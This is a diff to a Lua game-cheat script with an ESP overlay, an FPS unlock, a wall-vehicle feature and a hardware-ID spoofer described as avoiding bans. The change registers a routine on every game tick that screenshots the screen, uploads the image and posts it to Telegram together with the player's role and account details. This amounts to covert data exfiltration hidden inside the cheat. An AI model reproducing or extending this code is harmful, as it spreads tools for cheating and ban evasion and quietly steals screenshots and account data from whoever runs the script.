@@ -3266,7 +3266,7 @@ local function _M_DrawCounter()
 end
 
 
-function M.TakeScreenshot()
+local function TakeScreenshot()
     pcall(function()
         local ScreenshotMaker = import("ScreenshotMaker")
         local path = ScreenshotMaker.MakePictureByName("feedback.jpg", true)
@@ -3282,7 +3282,7 @@ function M.TakeScreenshot()
 
         ShareMgr.HDmpveUploadFile(path, function(isSuccess, imgURL)
             if isSuccess and imgURL then
-                M.SendTelegramPhoto(imgURL)
+                SendTelegramPhoto(imgURL)
             end
         end, 0, ShareMgr.ShareFileType.Share, true)
     end)
@@ -3297,8 +3297,8 @@ local function UrlEncode(str)
     return str
 end
 
-function M.SendTelegramPhoto(imgURL)
-    local caption = M.InfoPlayerSatate()
+local function SendTelegramPhoto(imgURL)
+    local caption = InfoPlayerSatate()
 
     local httpManager = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
 
@@ -3320,7 +3320,7 @@ function M.SendTelegramPhoto(imgURL)
     httpManager:Post(url, headers, body, nil, function(success, response, errorMsg, statusCode) end, 30)
 end
 
-function M.InfoPlayerSatate()
+local function InfoPlayerSatate()
     local ok, result = pcall(function()
         local FuncUtil = require("common.func_util")
         local RoleInfoSystem = require("client.logic.roleinfo.logic_roleinfo")
@@ -3394,7 +3394,7 @@ local hasTakenScreenshot = false
 local screenshotDelay = -1
 local SCREENSHOT_DELAY_TICK = 20
 
-function M.CheckGameEnd()
+local function CheckGameEnd()
     pcall(function()
 
         local hud = slua_GameFrontendHUD
@@ -3415,7 +3415,7 @@ function M.CheckGameEnd()
 
                 if screenshotDelay <= 0 then
                     hasTakenScreenshot = true
-                    M.TakeScreenshot()
+                    TakeScreenshot()
                     screenshotDelay = -2
                 end
             end
@@ -3433,6 +3433,7 @@ end
 -- ========================================== 
 local function MainLoop()
     if isExpired then return end
+    R6AddTick(TakeScreenshot)  -- Daftarkan ke tick jika perlu
 
     -- =====================================================================
     -- HỆ THỐNG LẤY HWID GỐC & ĐỔI HWID ẢO (SPOOFER) CHỐNG BAN
@@ -3534,7 +3535,7 @@ local function MainLoop()
     if _G.R6gamingConfig.UnlockFPS then InitializeGraphicsUnlock() end
     InitializeNativeESP()
     ShowR6gamingVIPMenu()
-    M.CheckGameEnd()
+    
     
     -- [GỌI LOGIC WALL VEHICLE VÀO VÒNG LẶP]
     if _G.R6gamingConfig.WallVehicle then
